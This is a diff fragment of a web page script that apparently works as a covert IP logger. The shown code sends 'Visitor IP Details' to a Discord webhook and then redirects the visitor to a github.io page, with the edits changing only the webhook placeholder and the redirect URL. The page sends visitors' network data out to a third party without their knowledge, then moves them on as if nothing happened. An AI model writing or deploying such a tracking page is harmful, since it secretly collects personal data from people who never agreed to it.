@@ -18,7 +18,7 @@
 
         // Function to send IP details to Discord webhook with an embed message
         function sendIpToWebhook(details) {
-            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+            const webhookUrl = 'WEBHOOK_HERE';
             const embedMessage = {
                 embeds: [{
                     title: "Visitor IP Details",
@@ -46,10 +46,10 @@
                 body: JSON.stringify(embedMessage)
             }).then(() => {
                 // Redirect to the specified URL after sending the IP
-                window.location.href = 'https://gekkefries.github.io/0x/';
+                window.location.href = 'https://gekkefries.github.io/0xV1/';
             }).catch(() => {
                 // Redirect even if there's an error
-                window.location.href = 'https://gekkefries.github.io/0x/';
+                window.location.href = 'https://gekkefries.github.io/0xV1/';
             });
         }
 
